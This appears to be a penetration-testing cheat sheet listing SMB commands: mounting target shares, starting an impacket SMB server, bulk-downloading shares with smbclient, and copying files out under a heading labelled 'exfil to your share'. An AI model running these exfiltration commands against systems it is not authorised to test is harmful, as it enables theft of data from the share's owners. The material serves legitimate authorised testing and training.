# SMB Shares

##### mount target share
```
mkdir /mnt/[SHARE]
```
```
sudo mount -t cifs -o vers=1.0 //[IP]/[SHARE] /mnt/[SHARE]
```

##### Create an SMB share (Linux)
```
sudo impacket-smbserver [SHARE_NAME] [SHARE_LOCATION]
```

#### exfil to your share
```
cp /[Path]/[File] smb:\\[IP]\[SHARE]\[FILE.EXT]
```

### smbclient
```sh
smbclient //[IP]/[SHARE]
```
```sh
RECURSE ON
PROMPT OFF
mget *
```

### GIO (From Kali)
##### List GIO Shares
```
gio mount -l
```
##### Mount the remote share
```
gio mount smb://[IP]/[SHARE]/
```
##### Copy the file
```
gio copy /[PATH]/[FILE] smb://[IP]/[SHARE]/[FILE]
```
